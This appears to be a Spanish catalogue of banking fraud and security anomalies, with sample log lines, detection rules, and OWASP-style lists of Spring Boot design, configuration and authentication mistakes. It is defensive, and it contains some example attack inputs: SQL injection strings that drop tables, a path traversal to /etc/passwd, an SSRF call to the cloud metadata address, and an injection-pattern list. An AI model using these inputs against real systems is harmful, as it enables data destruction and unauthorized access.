#### ANO-022 — Login desde IP de red Tor o VPN conocida

**Severidad:** ALTA | **Log:** `sesiones.log`

**Qué falla:** El cliente (o el atacante) oculta su IP real usando Tor o
una VPN conocida. En contexto bancario es indicador de ocultación deliberada.

**Patrón en logs:**
- `tipo_evento` = LOGIN_OK
- `ip` presente en lista negra de nodos Tor o rangos de VPN conocidos

```
sess-17|C001|2026-05-23T10:00:00|LOGIN_OK|185.220.101.5|WEB-Chrome
(185.220.101.5 es nodo de salida Tor conocido)
```

**Regla de detección:** `ip` del LOGIN_OK cruzada contra lista de nodos Tor
y rangos de VPN actualizados.

---

#### ANO-023 — Login desde IP de entidad financiera competidora

**Severidad:** MEDIA | **Log:** `sesiones.log`

**Qué falla:** La IP de acceso pertenece al rango de otra entidad bancaria
o financiera. Posible espionaje corporativo o reconocimiento.

**Patrón en logs:**
- `tipo_evento` = LOGIN_OK
- `ip` en rango CIDR registrado a nombre de otra entidad financiera

```
sess-18|C001|2026-05-23T10:00:00|LOGIN_OK|89.100.50.5|WEB-Chrome
(rango 89.100.50.0/24 registrado a BancoCompetidor S.A.)
```

**Regla de detección:** `ip` cruzada contra lista de rangos de entidades financieras.

---

#### ANO-024 — Múltiples cuentas distintas accedidas desde la misma IP en menos de 1 hora

**Severidad:** ALTA | **Log:** `sesiones.log`

**Qué falla:** Un atacante que controla varias cuentas robadas opera desde
la misma IP accediendo a todas en poco tiempo.

**Patrón en logs:**
- Misma `ip` en ≥ 4 registros LOGIN_OK de `cliente_id` distintos en < 60 min

```
sess-20|C001|2026-05-23T10:00:00|LOGIN_OK|91.200.100.1|WEB-Chrome
sess-21|C002|2026-05-23T10:12:00|LOGIN_OK|91.200.100.1|WEB-Chrome
sess-22|C003|2026-05-23T10:25:00|LOGIN_OK|91.200.100.1|WEB-Chrome
sess-23|C004|2026-05-23T10:38:00|LOGIN_OK|91.200.100.1|WEB-Chrome
```

**Regla de detección:** misma `ip`, ≥ 4 `cliente_id` distintos en LOGIN_OK
en < 60 min.

---

### CATEGORÍA D — Velocidad y volumen anómalo

#### ANO-025 — Más de 10 transacciones en 5 minutos desde la misma cuenta

**Severidad:** ALTA | **Log:** `transacciones.log`

**Qué falla:** Un humano no realiza 10 operaciones en 5 minutos. Indica
bot o script automatizado atacando o probando datos.

**Patrón en logs:**
- `cuenta_origen` = mismo valor
- ≥ 10 registros con `timestamp` en ventana de 5 minutos

```
2026-05-23T10:00:00|uuid-40|ES1234|...|500.00|EUR|PAGO_ONLINE|...|COMPLETADA
2026-05-23T10:00:23|uuid-41|ES1234|...|500.00|EUR|PAGO_ONLINE|...|COMPLETADA
... (hasta 10+ registros en menos de 5 min)
```

**Regla de detección:** misma `cuenta_origen`, COUNT(*) > 10 en ventana
deslizante de 5 minutos.

---

#### ANO-026 — Retiradas en cajeros geográficamente imposibles

**Severidad:** CRÍTICA | **Log:** `transacciones.log`

**Qué falla:** La misma tarjeta retira en dos cajeros de ciudades distintas
con menos tiempo del necesario para viajar entre ellas. Tarjeta clonada.

**Patrón en logs:**
- `tipo_operacion` = RETIRO_CAJERO
- `dispositivo_id` contiene ciudad o código de cajero distinto
- `timestamp` con diferencia menor al tiempo mínimo de viaje entre ubicaciones

```
2026-05-23T10:00:00|uuid-45|ES1234||300.00|EUR|RETIRO_CAJERO|...|ATM-Madrid-001|ES||sess-30||COMPLETADA
2026-05-23T10:45:00|uuid-46|ES1234||300.00|EUR|RETIRO_CAJERO|...|ATM-Barcelona-042|ES||sess-31||COMPLETADA
(Madrid→Barcelona mínimo 2.5h; aquí 45 min de diferencia)
```

**Regla de detección:** misma `cuenta_origen`, dos RETIRO_CAJERO con
`dispositivo_id` de ciudades distintas y `timestamp` imposible.

---

#### ANO-027 — Máximo diario en cajero 7 días consecutivos

**Severidad:** MEDIA | **Log:** `transacciones.log`

**Qué falla:** Sacar exactamente el máximo diario durante 7 días seguidos
es un patrón mecánico no natural. Indica automatización o vaciado planificado.

**Patrón en logs:**
- `tipo_operacion` = RETIRO_CAJERO
- `importe` = máximo permitido (ej. 600.00) exactamente
- `cuenta_origen` = mismo valor durante 7 timestamps en días consecutivos

```
2026-05-17T10:00:00|uuid-50|ES1234||600.00|EUR|RETIRO_CAJERO|...|COMPLETADA
2026-05-18T10:01:00|uuid-51|ES1234||600.00|EUR|RETIRO_CAJERO|...|COMPLETADA
... (7 días iguales)
```

**Regla de detección:** misma `cuenta_origen`, RETIRO_CAJERO con mismo
`importe` exacto en ≥ 7 días consecutivos.

---

#### ANO-028 — Pagos simultáneos con misma tarjeta en comercios físicos distintos

**Severidad:** CRÍTICA | **Log:** `transacciones.log`

**Qué falla:** Físicamente imposible pagar en dos comercios físicos al mismo
tiempo con la misma tarjeta. Indica tarjeta clonada en uso simultáneo.

**Patrón en logs:**
- `tipo_operacion` = PAGO_COMERCIO
- `cuenta_origen` = mismo valor
- `timestamp` con diferencia < 2 minutos
- `dispositivo_id` con referencia a terminales físicos distintos

```
2026-05-23T12:00:00|uuid-55|ES1234||45.00|EUR|PAGO_COMERCIO|...|TPV-Zara-Madrid|...|COMPLETADA
2026-05-23T12:00:30|uuid-56|ES1234||45.00|EUR|PAGO_COMERCIO|...|TPV-Mercadona-Valencia|...|COMPLETADA
```

**Regla de detección:** misma `cuenta_origen`, dos PAGO_COMERCIO con
`dispositivo_id` de ubicaciones distintas en < 2 min.

---

#### ANO-029 — Ráfaga de pagos online en distintos comercios en menos de 2 minutos

**Severidad:** ALTA | **Log:** `transacciones.log`

**Qué falla:** Bot probando datos de tarjeta robada en múltiples tiendas
online para encontrar cuál acepta antes de que el banco bloquee.

**Patrón en logs:**
- `tipo_operacion` = PAGO_ONLINE
- `cuenta_origen` = mismo valor
- ≥ 5 registros en < 2 minutos con `concepto` que indica comercios distintos

```
2026-05-23T15:00:00|uuid-60|ES1234||29.99|EUR|PAGO_ONLINE|...|Amazon|COMPLETADA
2026-05-23T15:00:22|uuid-61|ES1234||15.00|EUR|PAGO_ONLINE|...|Zara online|COMPLETADA
2026-05-23T15:00:45|uuid-62|ES1234||8.99|EUR|PAGO_ONLINE|...|Steam|FALLIDA
```

**Regla de detección:** misma `cuenta_origen`, ≥ 5 PAGO_ONLINE en < 2 min
con `concepto` variado.

---

#### ANO-030 — Transferencias programadas canceladas y reprogramadas repetidamente

**Severidad:** MEDIA | **Log:** `transacciones.log`

**Qué falla:** Cancelar y reprogramar la misma transferencia varias veces
puede ser manipulación del timing para sincronizar con otras operaciones.

**Patrón en logs:**
- Registro con `estado` = PENDIENTE para misma combinación origen/destino/importe
- Seguido de `estado` = FALLIDA (cancelación)
- Repetido ≥ 3 veces antes de la COMPLETADA final

```
2026-05-20T10:00:00|uuid-65|ES1234|ES9999|5000.00|EUR|TRANSFERENCIA|...|PENDIENTE
2026-05-20T10:05:00|uuid-65|ES1234|ES9999|5000.00|EUR|TRANSFERENCIA|...|FALLIDA
2026-05-21T10:00:00|uuid-66|ES1234|ES9999|5000.00|EUR|TRANSFERENCIA|...|PENDIENTE
2026-05-21T10:05:00|uuid-66|ES1234|ES9999|5000.00|EUR|TRANSFERENCIA|...|FALLIDA
2026-05-22T10:00:00|uuid-67|ES1234|ES9999|5000.00|EUR|TRANSFERENCIA|...|COMPLETADA
```

**Regla de detección:** misma combinación origen/destino/importe con ≥ 3
pares PENDIENTE→FALLIDA antes de COMPLETADA.

---

### CATEGORÍA E — Fallos técnicos e integridad de logs

#### ANO-031 — Timestamp de operación anterior al login de la sesión

**Severidad:** CRÍTICA | **Log:** `transacciones.log` + `sesiones.log`

**Qué falla:** Una operación no puede ocurrir antes de que el usuario
haya iniciado sesión. Indica manipulación de logs o error de sincronización.

**Patrón en logs:**
- `transacciones.log`: `timestamp` de TRANSFERENCIA < `timestamp` de LOGIN_OK
  del mismo `sesion_id` en `sesiones.log`

```
(sesiones.log)   sess-80|C001|2026-05-23T10:00:00|LOGIN_OK|...
(transacciones)  uuid-70|2026-05-23T09:45:00|ES1234|ES9999|5000.00|...|sess-80|...|COMPLETADA
```

**Regla de detección:** cruzar `sesion_id`; si `timestamp` en transacciones
< `timestamp` LOGIN_OK en sesiones para la misma sesión, alertar.

---

#### ANO-032 — Importe negativo o cero

**Severidad:** ALTA | **Log:** `transacciones.log`

**Qué falla:** Los importes siempre son positivos. Un importe negativo o cero
puede ser un intento de inyectar fondos ficticios o explotar un bug de validación.

**Patrón en logs:**
- `importe` ≤ 0 en cualquier registro

```
2026-05-23T10:00:00|uuid-71|ES1234|ES9999|-5000.00|EUR|TRANSFERENCIA|...|COMPLETADA
```

**Regla de detección:** cualquier registro con `importe` ≤ 0.

---

#### ANO-033 — Dos operaciones con el mismo transaction_id

**Severidad:** ALTA | **Log:** `transacciones.log`

**Qué falla:** Los IDs de transacción son únicos. Un duplicado indica
ataque de replay (reenviar una petición ya procesada) o bug en el sistema.

**Patrón en logs:**
- `transaction_id` idéntico en dos registros distintos

```
2026-05-23T10:00:00|uuid-REPLAY|ES1234|ES9999|5000.00|...|COMPLETADA
2026-05-23T10:00:01|uuid-REPLAY|ES1234|ES9999|5000.00|...|COMPLETADA
```

**Regla de detección:** GROUP BY `transaction_id` HAVING COUNT(*) > 1.

---

#### ANO-034 — Operación sin ip_origen registrada

**Severidad:** MEDIA | **Log:** `transacciones.log`

**Qué falla:** La IP de origen es obligatoria para la trazabilidad. Su
ausencia impide investigar el origen de la operación si hay un incidente.

**Patrón en logs:**
- Campo `ip_origen` vacío o nulo en cualquier registro

```
2026-05-23T10:00:00|uuid-72|ES1234|ES9999|5000.00|EUR|TRANSFERENCIA||WEB-Chrome|ES||sess-80||COMPLETADA
```

**Regla de detección:** cualquier registro con `ip_origen` vacío.

---

#### ANO-035 — Operación sin evento de autenticación previo en la misma sesión

**Severidad:** CRÍTICA | **Log:** `transacciones.log` + `sesiones.log`

**Qué falla:** Toda operación debe ir precedida de un LOGIN_OK en la misma
sesión. Si no existe, puede indicar bypass de autenticación.

**Patrón en logs:**
- `sesion_id` en `transacciones.log` que no tiene LOGIN_OK en `sesiones.log`

```
(sesiones.log): sin registro con sess-99 y tipo_evento=LOGIN_OK
(transacciones): uuid-73|2026-05-23T10:00:00|ES1234|ES9999|5000.00|...|sess-99|...|COMPLETADA
```

**Regla de detección:** LEFT JOIN sesiones ON sesion_id WHERE tipo_evento=LOGIN_OK
IS NULL para ese `sesion_id`.

---

#### ANO-036 — Gap temporal inexplicable en los logs

**Severidad:** ALTA | **Log:** `transacciones.log`

**Qué falla:** Un periodo sin ningún evento cuando debería haberlos indica
posible borrado de registros para ocultar actividad.

**Patrón en logs:**
- Diferencia entre dos `timestamp` consecutivos de la misma cuenta
  superior a lo esperado (ej. > 6 horas en horario de operación)

```
2026-05-23T09:00:00|uuid-74|ES1234|...  ← último evento
2026-05-23T17:45:00|uuid-75|ES1234|...  ← siguiente evento (8h45min de hueco)
```

**Regla de detección:** para cada `cuenta_origen`, detectar diferencia entre
`timestamp` consecutivos > umbral configurable en horario de actividad.

---

#### ANO-037 — Eventos generados más rápido de lo humanamente posible

**Severidad:** ALTA | **Log:** `transacciones.log`

**Qué falla:** Un humano necesita al menos varios segundos entre operaciones.
Intervalos de milisegundos indican un bot o script automatizado.

**Patrón en logs:**
- Múltiples registros de la misma `sesion_id` con diferencia de `timestamp` < 500ms

```
2026-05-23T10:00:00.100|uuid-76|ES1234|...|PAGO_ONLINE|...|COMPLETADA
2026-05-23T10:00:00.230|uuid-77|ES1234|...|PAGO_ONLINE|...|COMPLETADA
2026-05-23T10:00:00.350|uuid-78|ES1234|...|PAGO_ONLINE|...|COMPLETADA
```

**Regla de detección:** mismo `sesion_id`, diferencia entre `timestamp`
consecutivos < 500 milisegundos en ≥ 3 registros seguidos.

---

#### ANO-038 — Divisa no habilitada para el cliente

**Severidad:** MEDIA | **Log:** `transacciones.log`

**Qué falla:** El cliente opera en una divisa que no tiene habilitada en
su perfil. Puede ser intento de exploit o error de validación.

**Patrón en logs:**
- `divisa` = valor distinto de las divisas permitidas por el perfil del cliente

```
2026-05-23T10:00:00|uuid-79|ES1234|ES9999|1000.00|XBT|TRANSFERENCIA|...|COMPLETADA
(XBT no está en las divisas habilitadas para C001)
```

**Regla de detección:** cruzar `divisa` del registro con divisas permitidas
del `cliente_id`; alertar si no coincide.

---

#### ANO-039 — Importe con más de 2 decimales en EUR

**Severidad:** MEDIA | **Log:** `transacciones.log`

**Qué falla:** El euro tiene 2 decimales según ISO 4217. Un importe con
más decimales indica datos malformados o intento de manipulación.

**Patrón en logs:**
- `importe` con más de 2 decimales y `divisa` = EUR

```
2026-05-23T10:00:00|uuid-80|ES1234|ES9999|1000.001|EUR|TRANSFERENCIA|...|COMPLETADA
```

**Regla de detección:** validar que `importe` tenga como máximo los decimales
permitidos según estándar ISO 4217 para la `divisa` indicada.

---

#### ANO-040 — Concepto con SQL o scripts inyectados

**Severidad:** ALTA | **Log:** `transacciones.log`

**Qué falla:** El campo `concepto` es texto libre. Si contiene sentencias
SQL o scripts, puede indicar intento de inyección a través del formulario.

**Patrón en logs:**
- `concepto` contiene patrones como `'`, `--`, `<script>`, `DROP TABLE`, `OR 1=1`

```
uuid-81|...|ES1234|ES9999|100.00|EUR|TRANSFERENCIA|...|'; DROP TABLE transacciones; --|COMPLETADA
```

**Regla de detección:** campo `concepto` que coincide con patrones de
inyección SQL o XSS mediante expresión regular.

---

### CATEGORÍA F — Ingeniería social y fraude externo

#### ANO-041 — Cambio de datos por teléfono + transferencia inmediata

**Severidad:** ALTA | **Log:** `sesiones.log` + `transacciones.log`

**Qué falla:** Alguien llama al banco haciéndose pasar por el cliente,
cambia sus datos (vishing) y en < 2h aparece una transferencia grande.

**Patrón en logs:**
- `sesiones.log`: CAMBIO_CONTACTO (o evento de atención) del `cliente_id`
- `transacciones.log`: TRANSFERENCIA > umbral en < 2h con el mismo cliente

```
sess-90|C001|2026-05-23T10:00:00|CAMBIO_CONTACTO|CANAL_TELEFONO||
uuid-82|2026-05-23T11:30:00|ES1234|ES9999|15000.00|EUR|TRANSFERENCIA|...|COMPLETADA
```

**Regla de detección:** CAMBIO_CONTACTO seguido de TRANSFERENCIA > 5.000
en < 2h del mismo `cliente_id`.

---

#### ANO-042 — Primera transferencia a destino nuevo por importe alto

**Severidad:** ALTA | **Log:** `transacciones.log`

**Qué falla:** Estafa del CEO o fraude de urgencia: convencen al cliente
de transferir a una cuenta nueva con un pretexto de emergencia.

**Patrón en logs:**
- `cuenta_destino` sin historial previo con este `cuenta_origen`
- `importe` > umbral (ej. 3.000€)
- `concepto` contiene palabras de urgencia: "urgente", "emergencia", "CEO"

```
uuid-83|2026-05-23T10:00:00|ES1234|ES-NUNCA-VISTA|8000.00|EUR|TRANSFERENCIA|...|Urgente pago proveedor CEO|COMPLETADA
```

**Regla de detección:** primera aparición de `cuenta_destino` en el historial
de `cuenta_origen` con `importe` > 3.000.

---

#### ANO-043 — Operación desde dispositivo y IP habitual no reconocida por cliente

**Severidad:** MEDIA | **Log:** `transacciones.log`

**Qué falla:** El log muestra el dispositivo e IP habituales del cliente,
pero el cliente dice no haberla hecho. Posible familiar o conviviente.

**Patrón en logs:**
- `dispositivo_id` y `ip_origen` = valores habituales del cliente
- Operación reportada como no reconocida (evento externo al sistema)

```
uuid-84|2026-05-23T14:00:00|ES1234|ES5555|2000.00|EUR|TRANSFERENCIA|85.1.2.3|MOB-iPhone-HABITUAL|...|COMPLETADA
(cliente llama: "yo no hice esto" — mismo dispositivo, misma IP de casa)
```

**Regla de detección:** cruzar comportamiento habitual (dispositivo, IP, horario)
con la operación; si coincide pero el cliente la repudia, requiere investigación manual.

---

#### ANO-044 — Nombre de beneficiario con typosquatting

**Severidad:** MEDIA | **Log:** `transacciones.log`

**Qué falla:** El concepto o cuenta destino contiene un nombre muy similar
al de una empresa conocida pero con un carácter cambiado para engañar.

**Patrón en logs:**
- `concepto` contiene nombre con distancia de edición 1 respecto a empresa conocida
  (ej. "Amazom", "lnditex", "Santanderr")

```
uuid-85|...|ES1234|ES8888|5000.00|EUR|TRANSFERENCIA|...|Pago Amazom S.L.|COMPLETADA
```

**Regla de detección:** comparar `concepto` contra lista de empresas conocidas
usando distancia de Levenshtein ≤ 2; alertar si hay coincidencia cercana.

---

### CATEGORÍA G — Normativa y cumplimiento

#### ANO-045 — Supera 10.000€ sin generar alerta regulatoria

**Severidad:** CRÍTICA | **Log:** `transacciones.log`

**Qué falla:** La Ley 10/2010 obliga a reportar operaciones en efectivo
≥ 10.000€. Si el sistema no genera la alerta, incumple la normativa.

**Patrón en logs:**
- `importe` ≥ 10.000 y `tipo_operacion` = DEPOSITO o RETIRO_CAJERO
- Sin registro correspondiente en `anomalias_detectadas`

```
uuid-86|2026-05-23T10:00:00|ES1234||12000.00|EUR|DEPOSITO|...|COMPLETADA
(sin entrada en anomalias_detectadas para esta operación)
```

**Regla de detección:** cualquier DEPOSITO o RETIRO_CAJERO con `importe` ≥ 10.000
que no tenga alerta generada en `anomalias_detectadas`.

---

#### ANO-046 — Cliente en lista de sanciones internacionales operando

**Severidad:** CRÍTICA | **Log:** `transacciones.log`

**Qué falla:** El banco no puede operar con personas o entidades en listas
OFAC o UE de sanciones. Incumplimiento gravísimo con consecuencias penales.

**Patrón en logs:**
- `cuenta_origen` o `cuenta_destino` vinculada a `cliente_id` que aparece
  en lista de sanciones actualizada

```
uuid-87|2026-05-23T10:00:00|ES-SANCIONADO|ES9999|5000.00|EUR|TRANSFERENCIA|...|COMPLETADA
```

**Regla de detección:** cruzar `cliente_id` de toda operación contra lista
OFAC/UE actualizada diariamente.

---

#### ANO-047 — Transferencia a país bajo embargo o sanción internacional

**Severidad:** CRÍTICA | **Log:** `transacciones.log`

**Qué falla:** Enviar dinero a un país bajo embargo (RU, KP, IR...) puede
constituir violación de sanciones internacionales.

**Patrón en logs:**
- `pais_destino` = código ISO de país sancionado

```
uuid-88|2026-05-23T10:00:00|ES1234|KP-0001|3000.00|EUR|TRANSFERENCIA|ES|KP|...|COMPLETADA
```

**Regla de detección:** `pais_destino` en lista de países bajo embargo
actualizada por OFAC/UE.

---

#### ANO-048 — KYC desactualizado con operación de alto riesgo

**Severidad:** ALTA | **Log:** `transacciones.log`

**Qué falla:** El banco debe conocer a su cliente (KYC). Si el KYC tiene
más de 2 años y el cliente hace operaciones de alto riesgo, hay incumplimiento.

**Patrón en logs:**
- `importe` > 10.000 o `pais_destino` de riesgo alto
- `cliente_id` con `kyc_fecha` en tabla `clientes` > 2 años

```
uuid-89|2026-05-23T10:00:00|ES1234|ES9999|15000.00|EUR|TRANSFERENCIA|...|COMPLETADA
(clientes: kyc_fecha = 2023-01-10, hace más de 2 años)
```

**Regla de detección:** cruzar operaciones de riesgo con `kyc_fecha` del
cliente; alertar si `kyc_fecha` < NOW() - 730 días.

---

#### ANO-049 — Operativa no encaja con perfil de riesgo declarado

**Severidad:** MEDIA | **Log:** `transacciones.log`

**Qué falla:** Un cliente con perfil BAJO hace operaciones de perfil ALTO.
El banco asignó el perfil incorrecto o el cliente lo ocultó.

**Patrón en logs:**
- `importe` o `pais_destino` propios de perfil ALTO
- `cliente_id` con `perfil_riesgo` = BAJO en tabla `clientes`

```
uuid-90|2026-05-23T10:00:00|ES-BAJO-RIESGO|NG-0001|25000.00|EUR|TRANSFERENCIA|ES|NG|...|COMPLETADA
```

**Regla de detección:** cruzar `perfil_riesgo` del cliente con el nivel
de riesgo de la operación según sus campos.

---

### CATEGORÍA H — Insider threat (amenaza interna)

#### ANO-050 — Empleado consulta cuentas sin operación activa relacionada

**Severidad:** MEDIA | **Log:** `sesiones.log`

**Qué falla:** Un empleado no debería consultar cuentas de clientes sin
tener una operación activa que lo justifique. Puede ser preparación de fraude.

**Patrón en logs:**
- `tipo_evento` = CONSULTA_SALDO con `empleado_id` distinto del titular
- Sin operación relacionada en `transacciones.log` en los últimos 30 días
  para esa cuenta

```
sess-95|EMPLEADO-007|2026-05-23T10:00:00|CONSULTA_SALDO|10.0.0.5|INTERNO
(sin transacciones relacionadas con la cuenta consultada en 30 días)
```

**Regla de detección:** CONSULTA por `empleado_id` sobre cuenta sin actividad
vinculada en los últimos 30 días.

---

#### ANO-051 — Empleado aprueba operaciones fuera de su horario laboral

**Severidad:** ALTA | **Log:** `transacciones.log`

**Qué falla:** Las aprobaciones de operaciones sensibles por parte de empleados
deben ocurrir en horario laboral. Fuera de él puede indicar presión o fraude.

**Patrón en logs:**
- `empleado_id` en registro de `transacciones.log` con `timestamp` fuera
  de su franja horaria habitual (ej. < 08:00 o > 20:00 o fin de semana)

```
uuid-91|2026-05-24T02:30:00|ES9999|ES8888|50000.00|EUR|TRANSFERENCIA|...|empleado_id=007|COMPLETADA
(sábado a las 2:30am)
```

**Regla de detección:** cruzar `timestamp` de aprobación del `empleado_id`
con su horario registrado; alertar si está fuera.

---

#### ANO-052 — Empleado con pico repentino de aprobaciones

**Severidad:** ALTA | **Log:** `transacciones.log`

**Qué falla:** Un pico de aprobaciones muy por encima de la media del empleado
puede indicar que está siendo presionado o está cometiendo fraude.

**Patrón en logs:**
- `empleado_id` con COUNT de operaciones aprobadas en un día > 3× su media diaria

```
(media de empleado-007: 20 aprobaciones/día)
(2026-05-23: 85 aprobaciones del mismo empleado)
```

**Regla de detección:** calcular media de aprobaciones por `empleado_id`
en los últimos 30 días; alertar si el día actual supera 3× esa media.

---

#### ANO-053 — Empleado accede masivamente a datos antes de su baja

**Severidad:** ALTA | **Log:** `sesiones.log`

**Qué falla:** Un empleado que va a dejar la empresa accede masivamente a
datos de clientes para llevarse la cartera. Robo de datos antes de salir.

**Patrón en logs:**
- `empleado_id` con volumen de CONSULTA_SALDO muy superior a su media
- `timestamp` en los 30 días previos a la fecha de baja comunicada

```
sess-96|EMPLEADO-003|2026-05-20T09:00:00|CONSULTA_SALDO|10.0.0.3|INTERNO
... (200 consultas en 3 días; media habitual: 5/día)
```

**Regla de detección:** cruzar actividad del `empleado_id` con fechas de
bajas comunicadas en RRHH; alertar si volumen > 10× media en < 30 días previos.

---

#### ANO-054 — Aprobaciones cruzadas entre dos empleados (colusión)

**Severidad:** ALTA | **Log:** `transacciones.log`

**Qué falla:** Dos empleados se aprueban operaciones mutuamente de forma
recíproca para saltarse los controles de doble validación.

**Patrón en logs:**
- Empleado A aprueba operaciones donde el solicitante es Empleado B
- Empleado B aprueba operaciones donde el solicitante es Empleado A
- Patrón recíproco en ≥ 3 ocasiones en < 30 días

```
uuid-92|...|empleado_aprobador=007|empleado_solicitante=012|COMPLETADA
uuid-93|...|empleado_aprobador=012|empleado_solicitante=007|COMPLETADA
uuid-94|...|empleado_aprobador=007|empleado_solicitante=012|COMPLETADA
```

**Regla de detección:** detectar pares de `empleado_id` con aprobaciones
recíprocas ≥ 3 veces en 30 días.

---

## Diseño y arquitectura (errores de diseño)

- API REST que expone operaciones destructivas por GET.
  HTTP GET no debe modificar estado. Un enlace o bot puede
  ejecutar borrados sin querer. Solución: usar DELETE/PUT/POST
  para toda operación con efecto lateral.

- Ausencia de versionado en la API (/api/v1/...). Sin versiones,
  cualquier cambio rompe a todos los consumidores sin aviso.
  Solución: versionar desde el primer endpoint.

- Modelo de datos sin separación entre entidades de negocio
  y entidades de auditoría. Se mezclan datos operativos con
  trazas y se dificulta el análisis forense. Solución: tablas
  separadas de auditoría con escritura append-only.

- Endpoints REST que devuelven el objeto completo de base de
  datos directamente (mass assignment). El cliente recibe campos
  internos (contraseña hasheada, flags de riesgo) que no debería
  ver. Solución: usar DTOs explícitos en cada respuesta.

- Falta de separación de responsabilidades entre capas.
  Lógica de negocio dentro de los controladores REST.
  Cuando hay que cambiar una regla se toca en 10 sitios.
  Solución: arquitectura en capas (controller / service / repository).

- Diseño sin idempotencia en endpoints críticos. Si el cliente
  reintenta una transferencia por timeout puede ejecutarse dos
  veces. Solución: clave de idempotencia en cabecera y
  verificación antes de procesar.

- Ausencia de paginación en endpoints de listado. Devolver
  100.000 transacciones de golpe tumba el servidor y el cliente.
  Solución: paginación obligatoria con límite máximo por página.

- Sin límite en el tamaño del cuerpo de las peticiones.
  Un atacante envía un JSON de 2 GB y agota la memoria.
  Solución: spring.servlet.multipart.max-file-size y
  server.tomcat.max-http-form-post-size configurados.

- Dependencia directa entre módulos que debería ser asíncrona.
  Si el módulo de notificaciones cae, bloquea las transacciones.
  Solución: comunicación por cola de mensajes (Kafka, RabbitMQ).

- Sin circuit breaker en llamadas a servicios externos. Si el
  servicio de verificación de sanciones tarda 30 segundos, todos
  los hilos quedan bloqueados. Solución: Resilience4j con timeout
  y fallback.

---

## Implementación (OWASP Top 10 aplicado a Spring Boot)

- Inyección SQL por concatenación de strings en queries.
  El campo concepto de una transferencia contiene
  `' OR 1=1 --` y devuelve toda la tabla. Solución: solo
  JPA / PreparedStatement, nunca concatenación.

- Inyección SQL en parámetros de ordenación y filtrado.
  `?sort=nombre; DROP TABLE clientes` ejecutado directamente.
  Solución: validar con whitelist los campos permitidos para
  ordenar antes de pasarlos a la query.

- XSS almacenado en el campo concepto de transferencia.
  El panel de auditoría renderiza el concepto sin escapar y
  ejecuta el script en el navegador del auditor. Solución:
  Thymeleaf escapa por defecto; nunca usar th:utext con
  datos de usuario.

- Deserialización insegura de objetos Java. Si el endpoint
  acepta objetos Java serializados (application/x-java-serialized)
  puede ejecutarse código arbitrario. Solución: no aceptar nunca
  ese content-type; usar JSON.

- IDOR (Insecure Direct Object Reference). El endpoint
  /api/cuentas/1234 devuelve datos aunque el usuario autenticado
  sea dueño de la cuenta 5678. Solución: validar siempre que el
  recurso pedido pertenece al usuario de la sesión.

- Path traversal en endpoints que sirven ficheros.
  /api/logs?file=../../etc/passwd lee ficheros del sistema.
  Solución: normalizar la ruta y verificar que está dentro
  del directorio permitido.

- Server-Side Request Forgery (SSRF). Un campo URL en el cuerpo
  de la petición hace que el servidor llame a `http://169.254.169.254`
  (metadatos de nube). Solución: validar y restringir URLs
  permitidas en cualquier campo que el servidor use para hacer
  peticiones.

- Expression Language Injection en Spring. Datos de usuario
  que llegan a SpEL sin sanitizar pueden evaluar expresiones
  arbitrarias. Solución: no construir expresiones SpEL con
  datos externos.

- Uso de Random en vez de SecureRandom para tokens.
  Los tokens de sesión o de recuperación de contraseña son
  predecibles. Solución: siempre java.security.SecureRandom para
  cualquier valor criptográfico.

- Comparación de contraseñas con ==. Falla por referencia de
  String y además es vulnerable a timing attacks. Solución:
  BCryptPasswordEncoder.matches() de Spring Security.

- Log injection. El campo concepto contiene saltos de línea
  que insertan entradas de log falsas. Un atacante puede borrar
  trazas de su actividad con esta técnica. Solución: sanitizar
  o escapar saltos de línea antes de loguear campos externos.

- Número de versión de librerías visible en cabeceras HTTP.
  X-Powered-By: Spring Boot 3.1.0 facilita buscar CVEs exactos.
  Solución: server.error.include-stacktrace=never y eliminar
  cabeceras informativas.

---

## Configuración de Spring Boot / Spring Security

- spring.security.user.password dejado en el valor por defecto
  generado. En producción el password aleatorio se loguea al
  arrancar y cualquiera con acceso a los logs lo ve. Solución:
  configurar usuarios reales o eliminar el auto-configure.

- CSRF desactivado globalmente sin justificación.
  http.csrf().disable() en el SecurityConfig deja expuestos todos
  los endpoints a ataques cross-site. Solución: solo desactivar
  CSRF en APIs REST stateless que usen JWT; mantenerlo activo
  en formularios web.

- CORS configurado con allowedOrigins("*") en producción.
  Cualquier web puede hacer peticiones autenticadas a la API.
  Solución: lista explícita de orígenes permitidos.

- Actuator expuesto sin autenticación (/actuator/env,
  /actuator/heapdump). Cualquiera puede volcar la memoria
  y obtener credenciales. Solución: management.endpoints
  .web.exposure.include solo con los endpoints necesarios,
  protegidos con rol ADMIN.

- Perfil de producción no activo. La app arranca con
  application.properties de desarrollo, H2 en memoria y
  logs en DEBUG. Solución: forzar spring.profiles.active=prod
  en la variable de entorno del servidor.

- Timeout de sesión no configurado. Una sesión no cierra nunca
  y un token robado es válido indefinidamente. Solución:
  server.servlet.session.timeout=15m.

- HTTPS no forzado. Spring Boot sirve por HTTP si no se
  configura SSL. Según OWASP REST Security, toda API debe
  usar HTTPS. Solución: security.requiresChannel().anyRequest()
  .requiresSecure() y redirección de 80 a 443.

- Propiedades de la base de datos en application.properties
  en texto plano subido al repositorio. Las credenciales quedan
  expuestas en el historial de git para siempre. Solución:
  variables de entorno referenciadas con ${DB_PASS}.

- Nivel de log en producción puesto a DEBUG. Se escriben
  queries SQL completas con datos de clientes en el fichero
  de log. Solución: logging.level.root=WARN en producción.

- Error handling que devuelve stack traces al cliente.
  server.error.include-stacktrace=always expone estructura
  interna. Solución: handler global con @ControllerAdvice
  que devuelva solo el código de error y mensaje genérico.

---

## Autenticación

- Contraseñas almacenadas en MD5 o SHA-1 sin salt.
  Una tabla de rainbow crack resuelve el 80% en minutos.
  Solución: BCrypt con factor de coste mínimo 12.

- Sin bloqueo de cuenta tras intentos fallidos. Un atacante
  puede hacer fuerza bruta sin límite. Solución: bloqueo
  temporal tras 5 intentos fallidos con desbloqueo progresivo.

- Tokens JWT sin expiración (exp no configurado). Un token
  robado es válido para siempre. Solución: expiración corta
  (15 min) con refresh token de vida más larga.

- Algoritmo JWT cambiado a none. Si el servidor acepta
  alg:none puede forjarse cualquier token sin firma.
  Solución: rechazar explícitamente tokens con algoritmo none.

- Secret del JWT hardcodeado y corto. Clave de 8 caracteres
  descifrada por fuerza bruta offline. Solución: mínimo 256 bits
  generados con SecureRandom y almacenados en variable de entorno.

- Sin rotación de secretos. La misma clave JWT lleva 3 años
  sin cambiar. Si fue comprometida, todos los tokens son
  vulnerables. Solución: rotación periódica con ventana de
  transición.

- Recuperación de contraseña que revela si el email existe.
  Mensaje diferente para "email no encontrado" vs "email
  enviado". Permite enumerar cuentas. Solución: mismo mensaje
  genérico en ambos casos.
